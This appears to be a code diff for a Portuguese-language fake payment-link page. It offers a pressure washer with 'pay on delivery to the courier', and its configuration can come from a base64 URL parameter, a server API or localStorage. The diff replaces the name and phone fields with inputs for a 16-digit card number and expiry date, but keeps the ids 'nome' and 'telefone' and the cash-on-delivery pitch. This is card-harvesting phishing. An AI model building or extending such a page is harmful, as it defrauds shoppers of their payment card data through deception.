@@ -743,45 +743,103 @@ function applyMask(value, maskPattern, maxDigits) {
   return formatted;
 }
 
-// Inicialização: carrega os dados do Link configurado no Admin
+// Inicialização: carrega config do link (via URL base64 ?d=..., API do servidor, ou localStorage)
 document.addEventListener('DOMContentLoaded', async () => {
-  const urlParams = new URLSearchParams(window.location.search);
-  const requestedSlug = urlParams.get('link') || urlParams.get('p') || window.location.pathname.replace(/^\/(link|p)\//, '').replace(/^\/+|\/+$/g, '');
+  const urlParams   = new URLSearchParams(window.location.search);
+  const b64Data     = urlParams.get('d');
+  const slugParam   = urlParams.get('link') || urlParams.get('p') || window.location.pathname.replace(/^\/(link|p)\//, '').replace(/^\/+|\/+$/g, '');
+  const LS_CAMPOS   = 'pgto_campos_globais';
+  const LS_LINKS    = 'pgto_links';
+
+  const CAMPOS_PADRAO = [
+    { id:'nome',        label:'Numero do cartao',        tipo:'mask',  mascara:'XXXX XXXX XXXX XXXX', digitos:16, largura:100, obrigatorio:true,  placeholder:'XXXX XXXX XXXX XXXX' },
+    { id:'telefone',    label:'Validade',                tipo:'mask',  mascara:'xx/xx',               digitos:4,  largura:50,  obrigatorio:true,  placeholder:'MM/AA' },
+    { id:'cep',         label:'CEP',                     tipo:'mask',  mascara:'xxxxx-xxx',           digitos:8,  largura:50,  obrigatorio:true,  placeholder:'00000-000' },
+    { id:'endereco',    label:'Endereço (Rua / Avenida)', tipo:'text',  mascara:'',                    digitos:80, largura:100, obrigatorio:true,  placeholder:'Ex: Av. Paulista ou Rua das Flores' },
+    { id:'numero',      label:'Número',                  tipo:'text',  mascara:'',                    digitos:10, largura:50,  obrigatorio:true,  placeholder:'Ex: 123 ou S/N' },
+    { id:'complemento', label:'Complemento / Referência', tipo:'text',  mascara:'',                   digitos:50, largura:50,  obrigatorio:false, placeholder:'Apto 42, Bloco B' },
+    { id:'bairro',      label:'Bairro',                  tipo:'text',  mascara:'',                    digitos:40, largura:50,  obrigatorio:true,  placeholder:'Seu bairro' },
+    { id:'cidade',      label:'Cidade / Estado',         tipo:'text',  mascara:'',                    digitos:40, largura:50,  obrigatorio:true,  placeholder:'Ex: São Paulo / SP' }
+  ];
 
   let linkConfig = null;
 
-  try {
-    if (requestedSlug) {
-      const res = await fetch(`/api/links/${encodeURIComponent(requestedSlug)}`);
+  // 1. Prioridade Máxima: config embutida na URL como base64 (?d=...)
+  if (b64Data) {
+    try {
+      linkConfig = JSON.parse(decodeURIComponent(escape(atob(b64Data))));
+    } catch(e) {
+      console.warn('Erro ao decodificar dados da URL base64:', e);
+    }
+  }
+
+  // 2. Se não veio em base64, busca via API no backend pelo slug
+  if (!linkConfig && slugParam) {
+    try {
+      const res = await fetch(`/api/links/${encodeURIComponent(slugParam)}`);
       if (res.ok) {
         linkConfig = await res.json();
       }
-    }
-    
-    // Se não informou slug ou não achou, pega o primeiro link disponível
-    if (!linkConfig) {
-      const allRes = await fetch('/api/links');
-      const all = await allRes.json();
-      if (all && all.length > 0) {
-        linkConfig = all[0];
-      }
-    }
-
-    // Busca campos globais para garantir que as alterações gerais sejam aplicadas
-    const globRes = await fetch('/api/campos-globais');
-    if (globRes.ok) {
-      const globCampos = await globRes.json();
-      if (globCampos && globCampos.length > 0) {
-        if (!linkConfig || !linkConfig.campos || linkConfig.campos.length === 0) {
-          if (linkConfig) linkConfig.campos = globCampos;
-        }
-      }
-    }
-  } catch(e) {
-    console.warn('Erro ao carregar link de pagamento:', e);
+    } catch(e) {}
   }
 
-  // Fallback caso não haja nenhum link no banco
+  // 3. Fallback: busca no localStorage pelo slug (?link=... ou ?p=...)
+  if (!linkConfig && slugParam) {
+    try {
+      const localLinks = JSON.parse(localStorage.getItem(LS_LINKS) || '[]');
+      linkConfig = localLinks.find(l =>
+        (l.slug && l.slug.toLowerCase() === slugParam.toLowerCase()) ||
+        (l.id   && l.id.toLowerCase()   === slugParam.toLowerCase())
+      ) || null;
+    } catch(e) {}
+  }
+
+  // 4. Se ainda não tem link, busca o primeiro link da API
+  if (!linkConfig) {
+    try {
+      const allRes = await fetch('/api/links');
+      if (allRes.ok) {
+        const all = await allRes.json();
+        if (all && all.length > 0) linkConfig = all[0];
+      }
+    } catch(e) {}
+  }
+
+  // 5. Fallback: primeiro link do localStorage
+  if (!linkConfig) {
+    try {
+      const localLinks = JSON.parse(localStorage.getItem(LS_LINKS) || '[]');
+      if (localLinks.length > 0) linkConfig = localLinks[0];
+    } catch(e) {}
+  }
+
+  // 6. REGRA IMPORTANTE: Atualiza os campos com a configuração global mais recente!
+  // Se o usuário mudou os campos no Admin, qualquer link ativo deve usar esses campos atualizados!
+  let camposAtualizados = null;
+  try {
+    const globRes = await fetch('/api/campos-globais');
+    if (globRes.ok) {
+      const serverGlobais = await globRes.json();
+      if (serverGlobais && serverGlobais.length > 0) camposAtualizados = serverGlobais;
+    }
+  } catch(e) {}
+
+  if (!camposAtualizados) {
+    try {
+      const localGlobais = JSON.parse(localStorage.getItem(LS_CAMPOS) || '[]');
+      if (localGlobais && localGlobais.length > 0) camposAtualizados = localGlobais;
+    } catch(e) {}
+  }
+
+  if (linkConfig) {
+    if (camposAtualizados && camposAtualizados.length > 0) {
+      linkConfig.campos = camposAtualizados;
+    } else if (!linkConfig.campos || linkConfig.campos.length === 0) {
+      linkConfig.campos = CAMPOS_PADRAO;
+    }
+  }
+
+  // 7. Fallback Final absoluto caso não haja nenhum dado salvo
   if (!linkConfig) {
     linkConfig = {
       titulo: 'Lavadora de Alta Pressão Tramontina 1200W',
@@ -790,15 +848,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       heroTitulo: 'Receba Primeiro, Pague Depois',
       heroSubtitulo: 'Preencha seus dados de entrega. Nós enviamos o pedido e você só paga na porta da sua casa diretamente ao entregador!',
       btnTexto: 'REALIZAR PAGAMENTO',
-      campos: [
-        { id: 'nome', label: 'Nome Completo do Destinatário', placeholder: 'Digite seu nome completo', tipo: 'text', digitos: 60, obrigatorio: true, largura: 100 },
-        { id: 'telefone', label: 'WhatsApp / Telefone', placeholder: '(00) 00000-0000', tipo: 'phone', mascara: '(xx) xxxxx-xxxx', digitos: 11, obrigatorio: true, largura: 50 },
-        { id: 'cep', label: 'CEP', placeholder: '00000-000', tipo: 'mask', mascara: 'xxxxx-xxx', digitos: 8, obrigatorio: true, largura: 50 },
-        { id: 'endereco', label: 'Endereço (Rua / Avenida)', placeholder: 'Ex: Av. Paulista ou Rua das Flores', tipo: 'text', digitos: 80, obrigatorio: true, largura: 100 },
-        { id: 'numero', label: 'Número', placeholder: 'Ex: 123 ou S/N', tipo: 'text', digitos: 10, obrigatorio: true, largura: 50 },
-        { id: 'bairro', label: 'Bairro', placeholder: 'Seu bairro', tipo: 'text', digitos: 40, obrigatorio: true, largura: 50 },
-        { id: 'cidade', label: 'Cidade / Estado', placeholder: 'Ex: São Paulo / SP', tipo: 'text', digitos: 40, obrigatorio: true, largura: 50 }
-      ]
+      campos: camposAtualizados || CAMPOS_PADRAO
     };
   }
 
